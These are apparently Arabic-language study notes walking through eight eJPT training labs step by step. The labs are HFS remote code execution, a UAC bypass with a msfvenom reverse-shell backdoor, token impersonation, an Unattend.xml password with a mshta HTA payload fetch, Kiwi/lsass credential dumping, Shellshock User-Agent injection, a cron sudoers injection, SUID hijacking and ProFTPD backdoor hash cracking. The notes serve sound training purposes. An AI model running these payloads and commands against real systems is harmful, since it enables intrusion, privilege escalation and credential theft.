# Session 5 (ejpt) - Day 5
##  Host & Network Penetration Testing: part 2


السلام عليكم ورحمة الله وبركاته

اليوم باذن الله راح نبدا ماتوقفنا عليه امس والي هو لاب
UAC Bypass: UACMe

---

راح نبداء باللاب الاول الي هو 

UAC Bypass: UACMe
------------------|


طبعا زي مانشوف الان معطينا التارقت راح نسوي له فحص سريع بالـ nmap
[nmap 10.0.27.103]

نشوف ان بورت 80 شغال عليه HTTPFileServer 2.3
وهو مصاب بثغرة RCE
طبعا راح نبحث عن الاكسبلويت سواء في قوقل او فيه اداة searchsploit utility
طبعا هذي الاداة تستخدم قاعدة بيانات موقع exploitdb
لكن الي يفضل يستخدم الموقع يقدر يستخدمه او يستخدم هذي الادة 
[searchsploit hfs]
طبعا نلاحظ الان انه حصلنا الاكسبلويت الي هو Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)

راح نستخدم الـ MSFconsole في الاستغلال
نفتح الفريم وورك بالامر التالي
[msfconsole]  
ونستخدم هذا الموديول  
[use exploit/windows/http/rejetto_hfs_exec]  
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر  
[show options]  
نشوف انه طالب فقط الـ RHOST  
نعطيه القيمه لهذا المتغير المطلوب  
[set RHOSTS 10.0.27.103]  
[exploit] or [run]

والان قدرنا ناخذ meterpreter shell
راح نستخدم بعض اوامر هذا الشيل او هذي السيشن مثل
[getuid] عشان تحصل الـ Server username
[sysinfo] عشان يطبع لك معلومات عن التارقت مثل OS , Architecture , Logged On Users , etc...
طبعا زي مانشوف حنا الان يوزر admin
وحابين نكون اعلى صلاحيات الي هو Administrator

اول شي لابد نروح على بروسس معين والي هو explorer.exe process
عندنا طريقة عشان نكون شغالين على هذا البروسس او عشان نغير البروسس
الطريقة الاولى والي هي انه نطلب البروسس عن طريق الايدي تبعها او انه عن طريق اسمها 
حنا راح نستخدم الطريقه الاولى والي هي رقم البروسس عن طريق هذا الامر  
[ps -S explorer.exe] or [pgrep explorer.exe] عشان نحصل على رقم ايدي البروسس
الان نشوف انه حولنا على هذي البروسس بدون مشاكل  
طبعا هذي البروسس مزيتها انه شغاله دائما ماراح تتوقف بعكس لو اخذت مثلا على اي بروسس اخر احتمال يقطع ف بينتهي اتصالك ويقطع عليك الشيل  

الان راح نجرب نرفع صلاحياتنا عن طريق امر معين في الـ meterpreter session والي هو هذا الامر  
[getsystem] لرفع الصلاحيات بعد تغير البروسس الى explorer.exe  
نشوف انه رفض انه يرفع صلاحياتنا او ماقدر السيشن هذي ترفع صلاحياتنا  

طيب حنا يوزرنا admin هل هو حنا من ضمن قروب الـ Administrators? الان بنشيك  
[shell] عشان يفتح لنا الـ PowerShell  
[net localgroup administrators] هذا الامر عشان نشوف اليوزرات الي في هذا القروب  

نلاحظ انه فعلا حنا جزء من هذا القروب والي هو صلاحياته عاليه لكن حنا ماعندنا صلاحيات عاليه فبنقدر ناخذ اعلى صلاحيات عن طريق الـ Bypassing UAC  

طبعا الان بنسوي البايلود حقنا والي هو بيكون باستخدام اداة msfvenom  
[msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip_attacker LPORT=$port_attacker -f
exe > 'backdoor.exe']  

طبعا هذا الامر راح يسوي لنا بايلود داخل ملف exe نفس ماحددنا له طبعا هذا الامر تنفذه بجهازك  
طيب الان ندخل على الـ meterpreter session  
ونرفع الملفين الي هو البايلود وكذالك البايلود  
[cd C:\\Users\\admin\\AppData\\Local\\Temp] طبعا الان راح نرفعهم داخل هذا المسار وهو المفضل لانه دائما يكون عندك صلاحية القرائة والكتابة في هذا المسار وهذا موجود في اللينكس والويندوز   
طبعا حطينا دبل باك سلاش لان الميتربريتر تعتبر الباك سلاش واحد تعتبره سكيب ف عشان دبلناه  
[upload /root/Desktop/tools/UACME/Akagi64.exe .]  
[upload /root/backdoor.exe .]  
[ls]  
والان نشوف انه رفع لنا الملفين حقتنا الاول البايباس والثاني الي هو البايلود  
الان نفتح تاب ثاني عشان نفتح فيه الاتصال على البورت الي حددناه في البايلود  
نفتح الفريم وورك بالامر التالي
[msfconsole]  
ونستخدم هذا الموديول  
[use exploit/multi/handler]  
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر  
[show options]  
نشوف انه طالب مننا LHOST , LPORT , PAYLOAD  
[set PAYLOAD windows/meterpreter/reverse_tcp] لابد يكون البايلود هذا نفس الي حقناه داخل ملف الـ exe  
[set LHOST 10.10.1.3] هنا تحدد الايبي حقك وليس ايبي التارقت  
[set LPORT 4444] هنا نحدد نفس البورت الي في البايلود الي حقناه داخل ملف الـ exe  
[exploit] or [run]  

طبعا الان نشغل البايلود مع البايباس عشان يجينا اتصال باعلى صلاحيات ف خلونا نكتب الامر مع بعض  
[Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe]  
طبعا الان اشتغل , رقم 23 يعني انه استخدم لنا الطريقة الي رقمها 23 والطرق كثيره في هذي الاداة تقدر تقرا عنها في القيت هب  

ف هو الان راح يسوي البايباس ويشغل الباك دور حقنا بعدها راح يجينا اتصال على الليسنر الي فتحناه بالـ MSFconsole  
الان نرجع للليسنر نشوف انه عطانا اتصال الان وبنحاول نرفع صلاحياتنا الان  
[getsystem]  
وزي مانشوف الان قبل ورفع صلاحيتنا بنجرب نحمل الهاشات  
طبعا اذا نبي نسوي hashdump لابد نكون على بروسس معين والي هو lsass.exe  
راح نستخدم نفس الطريقه عشان نغير البروسس الي شغالين عليها  
[ps -S lsass.exe] عشان يعطينا ايدي البروسس  
[migrate 680] هذا الامر عشان ننتقل للبروسس الي حطينا رقمها  
الان حولنا على البروسس الي حددناه نجرب نسوي hashdump  
[hashdump]  
ونشوف انه عطانا الهاشات ومعنا كامل الصلاحيات الان وانتهينا من هذا اللاب  
References:  
1. Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (https://www.exploit-db.com/exploits/39161)  
2. Metasploit Module (https://www.rapid7.com/db/modules/exploit/windows/http/rejetto_hfs_exec)  
3. UACMe (https://github.com/hfiref0x/UACME)  

---

راح نبداء باللاب الثاني الي هو 

Privilege Escalation: Impersonate
---------------------------------|  

طبعا هذا اللاب فكرته بالاكسبلويت نفس الاكسبلويت السابق ف بنسوي نفس الخطوات الفرق فقط في طريقة رفع الصلاحيات  
طبعا زي مانشوف الان معطينا التارقت راح نسوي له فحص سريع بالـ nmap
[nmap -sV 10.0.28.7]  

نشوف ان بورت 80 شغال عليه HTTPFileServer 2.3  
وهو مصاب بثغرة RCE  
طبعا راح نبحث عن الاكسبلويت سواء في قوقل او فيه اداة searchsploit utility  
طبعا هذي الاداة تستخدم قاعدة بيانات موقع exploitdb  
لكن الي يفضل يستخدم الموقع يقدر يستخدمه او يستخدم هذي الادة   
[searchsploit hfs]  
طبعا نلاحظ الان انه حصلنا الاكسبلويت الي هو Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)  

راح نستخدم الـ MSFconsole في الاستغلال
نفتح الفريم وورك بالامر التالي
[msfconsole]  
ونستخدم هذا الموديول  
[use exploit/windows/http/rejetto_hfs_exec]  
والان نشوف وش المتغيرات المطلوبه مننا عن طريق هذا الامر  
[show options]  
نشوف انه طالب فقط الـ RHOST  
نعطيه القيمه لهذا المتغير المطلوب  
[set RHOSTS 10.0.28.7]  
[exploit] or [run]

والان قدرنا ناخذ meterpreter shell  

طيب الان وصلنا مرحلة رفع الصلاحيات راح نشوف مع بعض هذي الطريقة  
طبعا نشوف الان الـ Server username  
[getuid]  

طبعا لو حاولت ترفع صلاحياتك بهذا الامر ماراح تقدر  
[getsystem]  

طبعا راح نستخدم اداة اسمها incognito راح نستدعيها بهذا الامر  
[load incognito]  

الان راح نشوف التوكنز الموجوده عندنا وحنا راح ننتحل توكن عنده اعلى الصلاحيات  
[list_tokens -u] هذا الامر عشان نشوف كل التوكنز الموجوده  

نشوف انه الان عرض لنا التوكن حقنا وحق الـ Administrator الان راح ننتحله بهذا الامر  
[impersonate_token ATTACKDEFENSE\\Administrator] وقلنا ندبل الباك سلاش لانه الميتربريتر يتعبر الوحده سكيب وليس باك سلاش ف راح يحذفها  

الان طبعا اخذنا اعلى صلاحيات ونتاكد عن طريق الامر هذا  
[getuid]  
ونشوف انه معنا صلاحيات Administrator وهي اعلى صلاحيات الويندوز  

مطللوب مننا نقرا الفلاق فقط بهذا الامر  
[cat C:\\Users\\Administrator\\Desktop\\flag.txt]  
الان قريناه وانتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الثالث الي هو 

Unattended Installation
------------------------| 

طبعا هذي الاداة موجوده بابليك وهي بالبور شيل وظيفتها تجرب لك اكثر من تكنيك لرفع الصلاحيات  

الان لنفرض انك اخذت شيل وكلشي تمام وتبي تسوي رفع لصلاحياتك او تصعيد الصلاحيات طبعا راح ندخل على الـ Attacker Machine الي هي ويندوز  

نفتح الباور شيل ونشوف حنا مين اصلا ايش اليوزر الي معنا  
[whoami]  

طبعا التول مرفوعه على اللاب من اول وجاهزه راح ندخل للاداة  
[cd .\Desktop\PowerSploit\Privesc\]  

طيب الان الي بنسويه حنا بنسوي load لسكربت الي هو PowerUp.ps1  
[.\PowerUp.ps1]  
[R]عشان يشغله لنا  

طبعا فيه الامر هذا نسويه عشان مايسالنا كل مره جينا نشغله هل تبي تشغله او لا ونكتب R بيكون دايركت يشتغل  
[powershell -ep bypass]  

طبعا الان اي دالة نبي نستدعيها نقدر بكل سهوله راح نجرب نستدعي فنشكن  
[Invoke-PrivescAudit]  

طبعاالي يهمنا هو UnattendPath طبعا هذا ملف غالبا يكون فيه باسوردات النظام ولابد يكون له بولسي ومو اي احد يدخل الملف هذا  

راح نقرا الملف الان عشان نشوف هل فيه باسورد او لا  
[cat C:\Windows\Panther\Unattend.xml]  

طبعا نشوف انه فيه تاق اسمه PlainText قيمته هي false فهذا يعني انه مشفر لكن التشفير جدا سهل تفكه وهو نوعه base64  

ننسخ الباسورد الي بالتاق الي اسمه value نفكه في اي موقع او من الباورشيل نفسها  

[$password='QWRtaW5AMTIz'] طبعا هنا عرفنا المتغير وعطيناه قيمه  
[$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))] هذا الامر طبعا عشان نفك التشفير   
[echo $password] والان نطبع الباسورد بعد فك التشفير  

الان عطانا الباسورد الي هو Admin@123  
راح نفتح الـ cmd كا يوزر Administrator عن طريق هذا الامر  
[runas.exe /user:administrator cmd]  
الان راح يطلب منك الباسورد تسجله وتلاحظ انه دخل معك بدون اي مشاكل وصار معك كامل الصلاحيات  

الان نقدر نسوي اكثر من سيناريو عشان ناخذ ريفيرس شيل طبعا ومعنا الباسورد راح نكمل معكم بناخذ الشيل عن طريق msfconsole  

[msfconsole]  
[use exploit/windows/misc/hta_server] طبعا فكرة هذا الموديول انه يسوي لك صفحة واول مايدخلها الضحية علطول يحمل على جهازة باك دور ويعطيك ريفيرس شيل  
[exploit] or [run]  

الان نرجع للويندوز ونكتب هذا الامر  
[mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta] طبعا الرابط راح تعطيك الـ msfconsole  

ونلاحظ انه عطانا meterpreter shell  

طبعا مطلوب نقرا الفلاق والي هو هذا الامر  
[cat C:\\Users\\Administrator\\Desktop\\flag.txt]  

الى هنا انتهى اللاب نشوف الي بعده  

---

راح نبداء باللاب الرابع الي هو 

Windows: Meterpreter: Kiwi Extension
------------------------------------| 

طبعا الان راح نشوف مع بعض طريقة او اداة اخرى الي هي مرحلة مابعد الاستغلال وايش نقدر نسوي بعد الاستغلال مثل hashdump وغيرها من الاشياء الي ممكن تسويها بعد الاستغلال  

وهالمره راح نستخدم اداة اسمها Kiwi  

طبعا هذي الاداة او هذا الـ extension موجود في الـ meterpreter session  

فالبداية نحتاج ناخذ meterpreter session ف خلونا نسوي المعتاد وهو اولا انه نفحص ونشوف ايش الثغره الموجوده  

[nmap -sV 10.0.27.166]  

نشوف انه بورت 80 شغال وعليه سيرفر اسمه badblue 2.7 وهذا السيرفر بهذا الاصدار مصاب بثغرة اسمها Buffer Overflow راح نتسخدم الـ msfconsole عشان نستغل الثغره  

[msfconsole]  
[use exploit/windows/http/badblue_passthru]  
[show options]  
[set RHOSTS 10.0.27.166]  
[exploit] or [run]  

طبعا لابد نغير البروسس زي ماقلنا عشان مايقطع علينا الاتصال والان في حالتنا نجتاج نسوي hashdump ف بنحتاج نروح على بروسس اسمها lsass.exe زي ماذكرنا سابقا  
[migrate -N lsass.exe] عشان ننتقلل على هذا البروسس عن طريق الاسم وليس عن طريق الايدي  


والان نشوف انه اخذنا meterpreter session الان راح نستدعي الاداة عن طريق الامر التالي  
[load kiwi]  
[help] عشان نشوف كل الاوامر  

طبعا راح نسوي الي يهمنا منها والي هي  
[creds_all] وهذي عشان يسوي Dump للـ Administrator NTLM hash  
نشوف انه عطانا النتيجة ومعها كم معلومه زيادة  

والان عشان نطلع هاشات كل اليوزرات نسوي هذا الامر  
[lsa_dump_sam]  

نشوف انه عطانا كل الهاشات حق كل اليوزرات  

طيب الان مطلوب مننا الـ syskey او الـ system key  
[lsa_dump_secrets] هذا الامر عشان يسوي dump للـ syskey ومعلومات زيادة مثل الـ Local name , Domain name etc...  


الى هنا انتهى اللاب نشوف اللاب الي بعده مع بعض  

---

راح نبداء باللاب الخامس الي هو 

Shellshock
------------|  


طبعا الـ شيل شوك كانت ثغره في احد الـ CMS وكان الـ CVE حقها سنة 2014  

طبعا ماعطانا التارقت ناخذ الايبي حقنا ونزيد عليه واحد لاننا نعرف انه هو التارقت  

ونفصحه ونشوف ان بورت 80 مفتوح وشغال عليه Apache  

طبعا نفتح الموقع نفسه ونشوف السورس كود  
[http://192.14.111.3]  

حصللنا طبعا سكربت يسوي Git على ملف Cgi طبعا هذا الاكستنشن مصاب بهذي الثغره  

راح نشيك عن طريق سكربت nmap
[nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi”
192.14.111.3]  

طبعا لابد نعطيه مسار ملف الـ cgi الي حصلناه  

ونشوف انه قالنا انه فعلا مصاب بثغره الـ Shellshock  

طبعا نبحث الان عن الاكسبلويت راح نحصله هنا  
[Click here](https://github.com/opsxcq/exploit-CVE-2014-6271)  

طبعا راح نستغله يدوي عن طريق بروكسي او اداة اسمها Burpsuite  

وظيفتها نفس البروكسي تكون بينك وبين السيرفر ف راح يلقط اي ريكوست قبل يروح السيرفر  

طبعا بعد مانقرا الـ CVE نشوف انه فيه هيدر اسمه User-Agent: مصاب بثغرة command injection  

راح نفتح البرب سويت ونفتح البروكسي ونخليه intercept on  
طبعا الان نفتح ملف الـ cgi ونرجع للبرب سويت نحصله اعترض الطلب  
الان طبعا نرسله للريبيتر نضغط CTRL + R 
الان نحقن البايلود نفس الي بالـ CVE  

[User-Agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd']  

الان نسوي Send  

ونشوف انه فعلا قرا لنا ملف الـ /etc/passwd  

الان نقدر نلعب بالي بين الـ ''  
[User-Agent: () { :; }; echo; echo; /bin/bash -c 'id']  
[User-Agent: () { :; }; echo; echo; /bin/bash -c 'ps -ef']  


ونشوف انه جميع الاوامر اشتغلت الان نقدر ناخذ ريفيرس شيل باكثر من طريقة 


راح نجرب طريقة اخرى وهي عن طريق اداة curl  

[curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" \
http://192.14.111.3/gettime.cgi]  


ونشوف انه عطانا نفس النتيجة وقرا لنا ملف /etc/passwd  

---

راح نبداء باللاب السادس الي هو 

Cron Jobs Gone Wild II
----------------------|  

الـ Cron jobs باختصار شي موجود بلينكس   

طبعا فايدته مثلا نقول عندك مهمه انك تسوي نسخة احتياطيه كل يوم مثلا ف انت تسوي cron job تسويه عنك بالوقت الي محدده  

طبعا اللاب جاهز مدخلنا بيوزر student ويبي نرفع الصلاحيات الى root  

اول شي بنشوف لو كان فيه نفس اسم الملف بمكان اخر لانه عندنا ملف message بس ماعندنا صلاحيات عليه ابد فقط الروت الي يقدر يقرا او يكتب او يشغله  

ف راح نشوف لو فيه ملف اخر بنفس الاسم  
[find / -name message] عشان يبحث بكل الجهاز عن اي ملف اسمه message  

حصلنا واحد طبعا  /tmp/messages
طبعا بعد ماعندنا صلاحية الا قراءة ولا راح نستفيد بعد مانقراه لانه مافيه شي مهم  

فيه شي بالـ grep طبعا  
[grep -nri “/tmp/message” /usr]  

طبعا هذا يسوي نفس الليسنقن راح يورينا لو كان فيه كرون جوب او ملف يشتغل كلشوي وحنا مانعرف المصدر ف هذا راح يعطينا المصدر  

نشوف انه عطانا واحد اسمه copy.sh  

بنشوف الصلاحيات حقت الملف ونقراه  
[ls -l /usr/local/share/copy.sh]  
[cat /usr/local/share/copy.sh]  

نشوف انه عندنا كامل الصلاحيات قراءة وكتابه وتشغيل  

طبعا حاولنا نفتحه بالـ vim , nano بس ماقدرنا لانه غير موجود  

ف بنستخدم الـ echo >  

فبيكون الامر كذا  
[printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' >
/usr/local/share/copy.sh]  

طبعا هنا قلنا لك اضف هالنص في الملف والي هو  
خل اليوزر student يستخدم كل شي بالـ sudo بدون ماتطلب منه باسورد  واضفهم في الملف الي اسمه copy.sh  

فالان اضفناه تمام نقرا الملف  
[cat /usr/local/share/copy.sh]  

الان نشيك على الـ sudo -l  
[sudo -l]  
نشوف انه ماعندنا صلاحيات لانه باقي ماشتغلت الكرون جوب هذي ف لابد ننتظر لين تشتغل وراح تجينا الصلاحيات  

طبعا الملف يشتغل كل دقيقه ف بعد دقيقه ننفذ نفس الامر من جديد  
[sudo -l]  
نحصل انه اضافه لنا بدون اي مشاكل  

نكتب الامر هذا عشان تجينا صلاحيات الـ root  
[sudo su]  
[whoami]  

نشوف انه قالنا انه حنا الروت  

راح نقرا الفلاق الان  
[cat /root/flag.txt]  


---

راح نبداء باللاب السابع الي هو 

Exploiting Setuid Programs
---------------------------|  

طبعا في هذا اللاب راح نستغل او نرفع صلاحياتنا عن طريق الـ SUID  

راح نشوف وش الملفات الي عندنا وصلاحياتها  
[ls -la]  

راح نشوف انه فيه ملف نقدر نشغله ونقراه والي مسويه الروت فراح نقدر نستغله  

خلونا نشوف وش نوع الملف هذا  
[file welcome]  

طبعا الان نشوف انه elf file نفس الـ exe file  

راح نقرا النص الي داخل الملف طبعا لو نقراه بـ cat بيكون غير مفهوم  

راح نستخدم هذا الامر  
[strings welcome]  

نشوف انه حصلنا نص greetings  

طبعا هذا اسم ملف محصلينه حنا سابقا مع ملف welcome  

طبعا راح نحذف الملف ونسوي واحد خاص فينا عشان يفتح لنا bash shell as root  
[rm greetings] لحذف الملف  
[cp /bin/bash greetings] هذا عشان يفتح لنا الـ bash shell  

الان نشغل ملف الـ welcome لانه هو الي بيشغل لنا ملف الـ greetings الي سويناه  وبيشغله كروت يوزر  

الان شغلناه نشوف انه عطانا الروت ونقدر نقرا الفلاق بكل سهوله  
[cat /root/flag]  

---

راح نبداء باللاب الثامن الي هو 

Password Cracker: Linux
------------------------|  

في هذا اللاب راح نستخدم الـ metasploit (msfconsole)  

طبعا مطلوب مننا نجيب الهاش + نسوي له كراك  

اول شي نسوي nmap scan  
[nmap -sV 192.229.31.3]  

نشوف انه حصلنا الـ FTP وهذا الاصدار مصاب بثغره باك دور  

راح نستغل طبعا عن طريق الـ msfconsole  
[/etc/init.d/postgresql start] عشان نشغل الداتا بيس عشان يحفظ لنا الهاش فيها  

الان نفتح الفرييم وورك  
[msfconsole]  
[use exploit/unix/ftp/proftpd_133c_backdoor]  
[show options]  
[set RHOSTS 192.229.31.3]  
[exploit] or [run]  

الان عطانا الشيل نخليه في الخلفيه بالضغط على او نكتب  
[CTRL + Z] or [bg]

الان  نروح لموديل اخر الي بيسوي لنا dump  
[use post/linux/gather/hashdump]  
[set SESSION 1] 1 يعني رقم السشن تقدر تطلعها عن طريق كتباتة sessions  
[exploit] or [run]  

الان سوا لنا dump وحفظه لنا بقاعدة البيانات الي شغالناها  

الان نبي نسوي لها كراك عشان نقدر نقراها الان وهي كا hash غير قابل للقرائة ابدا  

فبنستخدم الموديول التالي عشان نسوي له كراك  
[use auxiliary/analyze/crack_linux]  
[set SHA512 true] SHA512 هذي تشير الى نوع التشفير المستخدم او الي حابين نفكه  
[exploit] or [run]  

وزي مانشوف الان عطانا الباسورد والفلاق المطلوب هو الباسورد  

---

اعتذر على الاطاله  

@s4cript | @cyberhub | @0xNawaF1
